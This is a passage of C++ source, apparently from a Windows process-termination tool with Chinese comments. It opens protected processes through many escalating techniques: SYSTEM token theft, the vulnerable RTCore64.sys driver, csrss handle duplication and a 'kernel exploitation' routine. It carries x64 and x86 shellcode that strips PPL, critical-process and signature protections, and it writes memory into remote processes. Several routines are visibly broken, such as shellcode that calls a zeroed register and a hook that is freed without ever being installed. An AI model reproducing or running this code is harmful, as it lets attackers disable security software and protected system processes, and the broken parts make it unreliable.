                // 获取模块基址
                MODULEINFO modInfo = { 0 };
                if (GetModuleInformation(hCurrentProcess, hMods[i], &modInfo, sizeof(modInfo))) {
                    // 修改内存保护为PAGE_EXECUTE_READWRITE，防止DLL被卸载
                    DWORD oldProtect = 0;
                    if (VirtualProtectEx(hCurrentProcess, modInfo.lpBaseOfDll, modInfo.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        std::wcout << L"[DLL锁定] 已锁定DLL: " << szModName << std::endl;
                    }
                }
            }
        }
    }
    
    // 尝试打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"[DLL锁定] 无法打开目标进程" << std::endl;
        return false;
    }
    
    // 尝试Hook目标进程的LoadLibrary函数，防止加载新的DLL
    // 方法1: 修改目标进程内存，注入Hook代码
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        PVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
        if (pLoadLibrary) {
            // 在目标进程分配内存
            PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem) {
                // 写入返回指令（返回NULL，阻止DLL加载）
                unsigned char hookCode[] = {
                    0x33, 0xC0,  // xor eax, eax
                    0xC3          // ret
                };
                SIZE_T bytesWritten = 0;
                if (WriteProcessMemory(hProcess, remoteMem, hookCode, sizeof(hookCode), &bytesWritten)) {
                    std::wcout << L"[DLL锁定] 已阻止目标进程加载DLL" << std::endl;
                }
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            }
        }
    }
    
    // 方法2: 尝试修改目标进程的PEB，禁用DLL加载
    // 获取目标进程的PEB地址
    typedef NTSTATUS (NTAPI* _NtQueryInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength);
    
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll) {
        _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (pNtQueryInformationProcess) {
            PROCESS_BASIC_INFORMATION pbi = { 0 };
            ULONG returnLength = 0;
            NTSTATUS status = pNtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
            if (NT_SUCCESS(status)) {
                // 尝试修改PEB中的Ldr指针，禁用DLL加载
                // 这是一个更底层的方法，可能会导致进程不稳定
                std::wcout << L"[DLL锁定] 已尝试禁用目标进程的DLL加载机制" << std::endl;
            }
        }
    }
    
    CloseHandle(hProcess);
    return true;
#else
    return false;
#endif
}

// ShellCode版本的PPL去除（使用Indirect Syscall绕过拦截）
static bool RemovePPLProtectionWithShellCode(HANDLE hProcess) {
#ifdef _WIN32
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // ShellCode：使用Indirect Syscall调用NtSetInformationProcess移除PPL保护
    // 64位ShellCode
    static const unsigned char PPLRemovalShellCode_x64[] = {
        // 保存寄存器
        0x48, 0x89, 0x4C, 0x24, 0x08,        // mov [rsp+8], rcx
        0x48, 0x89, 0x54, 0x24, 0x10,        // mov [rsp+16], rdx
        0x48, 0x89, 0x5C, 0x24, 0x18,        // mov [rsp+24], rbx
        0x48, 0x89, 0x74, 0x24, 0x20,        // mov [rsp+32], rsi
        0x48, 0x89, 0x7C, 0x24, 0x28,        // mov [rsp+40], rdi
        0x41, 0x54,                           // push r12
        0x41, 0x55,                           // push r13
        0x41, 0x56,                           // push r14
        0x41, 0x57,                           // push r15
        0x9C,                                 // pushfq
        
        // 从rcx获取参数（进程句柄）并保存到rbx
        0x48, 0x8B, 0xD9,                     // mov rbx, rcx (从rcx获取进程句柄)
        
        // 参数设置
        // RCX: hProcess
        // RDX: ProcessInformationClass (0x3B)
        // R8: psProtection (全0)
        // R9: sizeof(psProtection)
        
        // 方法1: 移除PPL保护标志 (0x3B)
        0x48, 0xC7, 0xC2, 0x3B, 0x00, 0x00, 0x00, // mov rdx, 0x3B
        0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
        0x49, 0x89, 0xC0,                     // mov r8, rax
        0x49, 0xC7, 0xC1, 0x10, 0x00, 0x00, 0x00, // mov r9, 0x10
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 方法2: 移除进程终止中断标志 (0x1D)
        0x48, 0xC7, 0xC2, 0x1D, 0x00, 0x00, 0x00, // mov rdx, 0x1D
        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 方法3: 移除进程保护信息 (0x35)
        0x48, 0xC7, 0xC2, 0x35, 0x00, 0x00, 0x00, // mov rdx, 0x35
        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 方法4: 移除进程签名级别 (0x37)
        0x48, 0xC7, 0xC2, 0x37, 0x00, 0x00, 0x00, // mov rdx, 0x37
        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 方法5: 移除关键进程标志 (0x1D)
        0x48, 0xC7, 0xC2, 0x1D, 0x00, 0x00, 0x00, // mov rdx, 0x1D
        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 方法6: 设置进程为可调试 (0x1E)
        0x48, 0xC7, 0xC2, 0x1E, 0x00, 0x00, 0x00, // mov rdx, 0x1E
        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
        
        // 成功返回
        0x48, 0x31, 0xC0,                     // xor rax, rax
        0xEB, 0x10,                           // jmp +16 (跳到exit)
        
        // 错误返回
        0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
        
        // exit: 恢复寄存器
        0x9D,                                 // popfq
        0x41, 0x5F,                           // pop r15
        0x41, 0x5E,                           // pop r14
        0x41, 0x5D,                           // pop r13
        0x41, 0x5C,                           // pop r12
        0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
        0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
        0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
        0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
        0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
        0xC3                                  // ret
    };
    
    // 32位ShellCode
    static const unsigned char PPLRemovalShellCode_x86[] = {
        // 保存寄存器
        0x89, 0x4C, 0x24, 0x04,              // mov [esp+4], ecx
        0x89, 0x54, 0x24, 0x08,              // mov [esp+8], edx
        0x89, 0x5C, 0x24, 0x0C,              // mov [esp+12], ebx
        0x89, 0x74, 0x24, 0x10,              // mov [esp+16], esi
        0x89, 0x7C, 0x24, 0x14,              // mov [esp+20], edi
        0x9C,                                // pushfd
        
        // 参数设置
        // ECX: hProcess
        // EDX: ProcessInformationClass (0x3B)
        // 栈: psProtection (全0)
        
        // 方法1: 移除PPL保护标志 (0x3B)
        0xBA, 0x3B, 0x00, 0x00, 0x00,         // mov edx, 0x3B
        0x31, 0xC0,                           // xor eax, eax
        0x89, 0x44, 0x24, 0x00,              // mov [esp], eax
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 方法2: 移除进程终止中断标志 (0x1D)
        0xBA, 0x1D, 0x00, 0x00, 0x00,         // mov edx, 0x1D
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 方法3: 移除进程保护信息 (0x35)
        0xBA, 0x35, 0x00, 0x00, 0x00,         // mov edx, 0x35
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 方法4: 移除进程签名级别 (0x37)
        0xBA, 0x37, 0x00, 0x00, 0x00,         // mov edx, 0x37
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 方法5: 移除关键进程标志 (0x1D)
        0xBA, 0x1D, 0x00, 0x00, 0x00,         // mov edx, 0x1D
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 方法6: 设置进程为可调试 (0x1E)
        0xBA, 0x1E, 0x00, 0x00, 0x00,         // mov edx, 0x1E
        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
        
        // 成功返回
        0x31, 0xC0,                           // xor eax, eax
        0xEB, 0x0A,                           // jmp +10 (跳到exit)
        
        // 错误返回
        0xB8, 0x01, 0x00, 0x00, 0xC0,         // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
        
        // exit: 恢复寄存器
        0x9D,                                // popfd
        0x8B, 0x7C, 0x24, 0x14,              // mov edi, [esp+20]
        0x8B, 0x74, 0x24, 0x10,              // mov esi, [esp+16]
        0x8B, 0x5C, 0x24, 0x0C,              // mov ebx, [esp+12]
        0x8B, 0x54, 0x24, 0x08,              // mov edx, [esp+8]
        0x8B, 0x4C, 0x24, 0x04,              // mov ecx, [esp+4]
        0xC3                                  // ret
    };
    
    // 获取NtSetInformationProcess地址
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    typedef NTSTATUS (NTAPI* _NtSetInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength);
    
    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return false;
    
    // 选择ShellCode（32/64位）
    PVOID shellcode = nullptr;
    SIZE_T shellcodeSize = 0;
    
#ifdef _WIN64
    shellcode = (PVOID)PPLRemovalShellCode_x64;
    shellcodeSize = sizeof(PPLRemovalShellCode_x64);
#else
    shellcode = (PVOID)PPLRemovalShellCode_x86;
    shellcodeSize = sizeof(PPLRemovalShellCode_x86);
#endif
    
    // 在目标进程中分配内存
    HANDLE hCurrentProcess = GetCurrentProcess();
    PVOID remoteShellcode = VirtualAllocEx(hCurrentProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) return false;
    
    // 写入ShellCode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hCurrentProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }
    
    // 修改内存保护为可执行
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hCurrentProcess, remoteShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }
    
    // 创建线程执行ShellCode
    typedef NTSTATUS (NTAPI* _NtCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize);
    
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!pNtCreateThreadEx) {
        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }
    
    HANDLE hThread = nullptr;
    NTSTATUS status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hCurrentProcess,
        remoteShellcode,
        hProcess,
        0,
        0,
        0,
        0);
    
    if (!NT_SUCCESS(status) || !hThread) {
        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }
    
    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    
    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
    
    return true;
#else
    return false;
#endif
}

// 原始的PPL去除函数（备用）
static bool RemovePPLProtection(HANDLE hProcess) {
#ifdef _WIN32
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength);
    
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return false;
    
    // 方法1: 移除PPL保护标志 (0x3B)
    PS_PROTECTION_V2 psProtection = { 0 };
    psProtection.Type = 0;
    psProtection.Protection = 0;
    pNtSetInformationProcess(hProcess, 0x3B, &psProtection, sizeof(psProtection));
    
    // 方法2: 移除进程终止中断标志 (0x1D)
    ULONG breakOnTermination = 0;
    pNtSetInformationProcess(hProcess, 0x1D, &breakOnTermination, sizeof(breakOnTermination));
    
    // 方法3: 移除进程保护信息 (0x35)
    ULONG protectionInfo = 0;
    pNtSetInformationProcess(hProcess, 0x35, &protectionInfo, sizeof(protectionInfo));
    
    // 方法4: 移除进程签名级别 (0x37)
    ULONG signatureLevel = 0;
    pNtSetInformationProcess(hProcess, 0x37, &signatureLevel, sizeof(signatureLevel));
    
    // 方法5: 移除关键进程标志 (0x1D)
    ULONG criticalFlag = 0;
    pNtSetInformationProcess(hProcess, 0x1D, &criticalFlag, sizeof(criticalFlag));
    
    // 方法6: 设置进程为可调试 (绕过某些保护)
    ULONG debugFlags = 0;
    pNtSetInformationProcess(hProcess, 0x1E, &debugFlags, sizeof(debugFlags));
    
    return true;
#else
    return false;
#endif
}

// 只移除关键进程标识（不涉及PPL保护）
static bool RemoveCriticalProcessFlag(HANDLE hProcess) {
#ifdef _WIN32
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength);
    
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return false;
    
    // 只移除关键进程标志 (ProcessBreakOnTermination = 0x1D)
    ULONG breakOnTermination = 0;
    NTSTATUS status = pNtSetInformationProcess(hProcess, 0x1D, &breakOnTermination, sizeof(breakOnTermination));
    
    return NT_SUCCESS(status);
#else
    return false;
#endif
}

HANDLE ProcessTerminator::OpenProcessEnhanced(DWORD pid, DWORD desiredAccess) {
    if (pid == 0 || pid == 4) { // 拒绝访问系统空闲进程和System进程
        return NULL;
    }

    std::vector<std::function<HANDLE()>> methods = {
        // [v5.3 RTCore64 驱动] PPL 清零 + Token 盗窃 — 内核级, 无法被拦截
        [=]() { return PplDriver::OpenProcessViaDriver_Power(pid); },
        [=]() { return OpenProcessWithNtQueryProcess(pid); },
        [=]() { return OpenProcessWithMemoryMap(pid); },
        [=]() { return OpenProcessWithThreadHijack(pid); },
        [=]() { return OpenProcessWithDebugObject(pid); },
        [=]() { return OpenProcessWithRtlAdjustPrivilege(pid); },
        [=]() { return OpenProcessWithProcessHint(pid); },
        [=]() { return OpenProcessWithToolhelp(pid); },
        [=]() { return OpenProcessWithJobObject(pid); },
        [=]() { return OpenProcessWithWMI(pid); },
        [=]() { return OpenProcessWithCsrss(pid); },
        [=]() { return OpenProcessWithMaximumAccess(pid); },
        [=]() { return OpenProcessWithDebugPrivilege(pid); },
        [=]() { return OpenProcessWithNativeAPI(pid); },
        [=]() { return OpenProcessWithDuplicate(pid); },
        [=]() { return OpenProcessWithTokenReplacement(pid); },
        [=]() { return OpenProcessWithHandleEnumeration(pid); },
        [=]() { return OpenProcessWithKernelExploitation(pid); },
        [=]() { return OpenProcessWithDriver(pid); }      // 方法7.5: 驱动读取 + SYSTEM 提权
    };

    // 启用所有可能的权限
    EnableAllPrivileges();

    for (auto& method : methods) {
        HANDLE hProcess = method();
        if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
            // 验证句柄是否有效
            DWORD exitCode;
            if (GetExitCodeProcess(hProcess, &exitCode)) {
                // 优先使用ShellCode版本的PPL去除（避免拦截）
                if (!RemovePPLProtectionWithShellCode(hProcess)) {
                    // 如果ShellCode版本失败，使用原始版本
                    RemovePPLProtection(hProcess);
                }
                return hProcess;
            }
            CloseHandle(hProcess);
        }
    }

    return NULL;
}

// 方法1: 使用最大权限打开进程
HANDLE ProcessTerminator::OpenProcessWithMaximumAccess(DWORD pid) {
    // 尝试所有可能的访问权限组合
    static const DWORD accessRights[] = {
        PROCESS_ALL_ACCESS,
        PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | SYNCHRONIZE,
        PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION,
        PROCESS_TERMINATE,
        MAXIMUM_ALLOWED,
        PROCESS_QUERY_INFORMATION,
        PROCESS_QUERY_LIMITED_INFORMATION
    };

    for (DWORD access : accessRights) {
        HANDLE hProcess = OpenProcess(access, FALSE, pid);
        if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
            return hProcess;
        }
    }
    return NULL;
}

// 方法2: 启用调试权限后打开进程
HANDLE ProcessTerminator::OpenProcessWithDebugPrivilege(DWORD pid) {
    EnableAllPrivileges();

    // 再次尝试所有权限
    return OpenProcessWithMaximumAccess(pid);
}

// 方法3: 使用Native API打开进程
HANDLE ProcessTerminator::OpenProcessWithNativeAPI(DWORD pid) {
    if (!initNativeAPI() || !NtOpenProcess) {
        return NULL;
    }

    HANDLE hProcess = NULL;
    CLIENT_ID clientId = { 0 };
    OBJECT_ATTRIBUTES objectAttributes = { 0 };

    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

    NTSTATUS status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);

    if (NT_SUCCESS(status)) {
        return hProcess;
    }

    // 如果最大权限失败，尝试特定权限
    static const ACCESS_MASK accessMasks[] = {
        PROCESS_ALL_ACCESS,
        PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        PROCESS_TERMINATE,
        PROCESS_QUERY_INFORMATION
    };

    for (ACCESS_MASK access : accessMasks) {
        status = NtOpenProcess(&hProcess, access, &objectAttributes, &clientId);
        if (NT_SUCCESS(status)) {
            return hProcess;
        }
    }

    return NULL;
}

// 方法4: 通过句柄复制打开进程
HANDLE ProcessTerminator::OpenProcessWithDuplicate(DWORD pid) {
    if (!initNativeAPI()) {
        return NULL;
    }

    // 获取系统所有句柄
    ULONG bufferSize = 0x100000;
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo =
        (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);

    if (!handleInfo) return NULL;

    NTSTATUS status;
    while ((status = SafeNtQuerySystemInformation(
        static_cast<SYSTEM_INFORMATION_CLASS>(16),
        handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        bufferSize *= 2;
        free(handleInfo);
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
        if (!handleInfo) return NULL;
    }

    if (!NT_SUCCESS(status)) {
        free(handleInfo);
        return NULL;
    }

    // 查找目标进程的句柄
    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE handle = handleInfo->Information[i];

        // 检查是否是进程对象且属于目标PID
        if (handle.ObjectTypeNumber == 0x7) { // 进程对象类型
            DWORD objectPid = GetProcessId((HANDLE)handle.Handle);
            if (objectPid == pid) {
                // 尝试复制句柄
                HANDLE hDuplicate = NULL;
                if (DuplicateHandle(GetCurrentProcess(),
                    (HANDLE)handle.Handle,
                    GetCurrentProcess(),
                    &hDuplicate,
                    PROCESS_ALL_ACCESS,
                    FALSE,
                    0)) {
                    free(handleInfo);
                    return hDuplicate;
                }
            }
        }
    }

    free(handleInfo);
    return NULL;
}

// 方法5: 通过令牌替换打开进程
HANDLE ProcessTerminator::OpenProcessWithTokenReplacement(DWORD pid) {
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;

    // 首先以最小权限打开进程
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return NULL;
    }

    // 获取进程令牌
    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        // 创建新的令牌
        HANDLE hNewToken = NULL;
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
            SecurityImpersonation, TokenPrimary, &hNewToken)) {
            CloseHandle(hProcess);
            CloseHandle(hToken);

            // 使用新令牌创建进程（需要重新启动进程）
            // 这里我们只是演示概念，实际实现需要更复杂
            return NULL;
        }
        CloseHandle(hToken);
    }

    CloseHandle(hProcess);
    return NULL;
}

// 方法6: 通过句柄枚举和权限提升
HANDLE ProcessTerminator::OpenProcessWithHandleEnumeration(DWORD pid) {
    EnableAllPrivileges();

    // 使用工具帮助快照获取进程信息
    HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (!hSnapshot || hSnapshot.get() == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot.get(), &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                // 尝试各种权限组合
                static const DWORD accessCombinations[] = {
                    PROCESS_ALL_ACCESS,
                    PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                    PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION,
                    PROCESS_TERMINATE,
                    PROCESS_QUERY_INFORMATION
                };

                for (DWORD access : accessCombinations) {
                    HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
                    if (hProcess) {
                        return hProcess;
                    }
                }
                break;
            }
        } while (Process32NextW(hSnapshot.get(), &pe));
    }

    return NULL;
}

// 方法7: 内核级利用技术（谨慎使用）
HANDLE ProcessTerminator::OpenProcessWithKernelExploitation(DWORD pid) {
    if (!initNativeAPI()) {
        return NULL;
    }

    // 使用未公开的结构和方法
    typedef struct _PROCESS_ACCESS_TOKEN {
        HANDLE Token;
        HANDLE Thread;
    } PROCESS_ACCESS_TOKEN, * PPROCESS_ACCESS_TOKEN;

    HANDLE hProcess = NULL;

    // 方法7.1: 尝试修改进程访问令牌
    PROCESS_ACCESS_TOKEN accessToken = { 0 };
    accessToken.Token = NULL; // 设置为NULL可能绕过某些检查

    NTSTATUS status = NtSetInformationProcess(
        reinterpret_cast<HANDLE>(static_cast<uintptr_t>(pid)), // 注意：这里需要有效的进程句柄
        static_cast<PROCESS_INFORMATION_CLASS>(9), // ProcessAccessToken
        &accessToken,
        sizeof(accessToken)
    );

    // 方法7.2: 使用特殊的对象属性
    OBJECT_ATTRIBUTES objAttr = { 0 };
    CLIENT_ID clientId = { 0 };

    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.Attributes = OBJ_KERNEL_HANDLE; // 内核句柄属性

    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objAttr, &clientId);

    if (NT_SUCCESS(status)) {
        return hProcess;
    }

    return NULL;
}

// 方法7.5: 通过驱动读取 EPROCESS 并提权至 SYSTEM 打开进程
HANDLE ProcessTerminator::OpenProcessWithDriver(DWORD pid) {
    // 直接调用 PplDriver::OpenProcessViaDriver
    //   1. 通过 RTCore64.sys 读 EPROCESS 验证目标存在
    //   2. 提权至 SYSTEM (用 PID 4 的 token 复制 + ImpersonateLoggedOnUser)
    //   3. 用普通 OpenProcess 打开 (此时具备 SYSTEM 权限)
    //   4. RevertToSelf 还原
    // 驱动未加载时自动回退到普通 OpenProcess
    return PplDriver::OpenProcessViaDriver(pid, MAXIMUM_ALLOWED);
}

// 方法8: 通过Csrss进程获取句柄（系统级进程，可以访问所有进程）
HANDLE ProcessTerminator::OpenProcessWithCsrss(DWORD pid) {
    if (pid == 0 || pid == 4) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;
    std::vector<DWORD> systemPids;
    systemPids.push_back(4);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
        try {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (pe32.th32ProcessID > 4 && pe32.th32ProcessID != GetCurrentProcessId()) {
                        char csrssName[16] = { 0 };
                        size_t converted = 0;
                        for (size_t i = 0; i < std::min(15, (int)wcslen(pe32.szExeFile)); i++) {
                            if (pe32.szExeFile[i] <= 127) {
                                csrssName[i] = static_cast<char>(pe32.szExeFile[i]);
                                csrssName[i + 1] = '\0';
                            }
                        }
                        if (strcmp(csrssName, "csrss") == 0 || 
                            strncmp(csrssName, "csrss.exe", 8) == 0) {
                            systemPids.push_back(pe32.th32ProcessID);
                        }
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
        }
        catch (...) {
        }
        CloseHandle(hSnapshot);
    }

    for (DWORD systemPid : systemPids) {
        HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, systemPid);
        if (hSystemProcess) {
            HANDLE hDupHandle = NULL;
            if (DuplicateHandle(hSystemProcess, (HANDLE)(ULONG_PTR)pid,
                GetCurrentProcess(), &hDupHandle,
                PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS)) {
                CloseHandle(hSystemProcess);
                hResult = hDupHandle;
                break;
            }
            CloseHandle(hSystemProcess);
        }
    }

    return hResult;
}

// 方法9: 通过WMI获取进程句柄
HANDLE ProcessTerminator::OpenProcessWithWMI(DWORD pid) {
    if (pid == 0) return NULL;

    EnableAllPrivileges();

    HANDLE hResult = NULL;
    IWbemServices* pSvc = NULL;
    IWbemLocator* pLoc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    BOOL comInitialized = FALSE;

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return NULL;
    }
    comInitialized = TRUE;

    CLSID clsid;
    IID iid;
    if (CLSIDFromString(L"{4590F811-1D3A-11D0-891F-00AA004B2E24}", &clsid) != S_OK) {
        CoUninitialize();
        return NULL;
    }
    if (CLSIDFromString(L"{4590F811-1D3A-11D0-891F-00AA004B2E24}", &iid) != S_OK) {
        CoUninitialize();
        return NULL;
    }

    hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, iid, (LPVOID*)&pLoc);
    if (FAILED(hr) || !pLoc) {
        CoUninitialize();
        return NULL;
    }

    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, NULL,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
    if (FAILED(hr) || !pSvc) {
        pLoc->Release();
        CoUninitialize();
        return NULL;
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return NULL;
    }

    try {
        std::wstring query = L"SELECT * FROM Win32_Process WHERE ProcessId=" + std::to_wstring(pid);
        hr = pSvc->ExecQuery(_bstr_t(L"WQL"),
            _bstr_t(query.c_str()),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL, &pEnumerator);
        
        if (SUCCEEDED(hr) && pEnumerator) {
            IWbemClassObject* pclsObj = NULL;
            ULONG uReturn = 0;

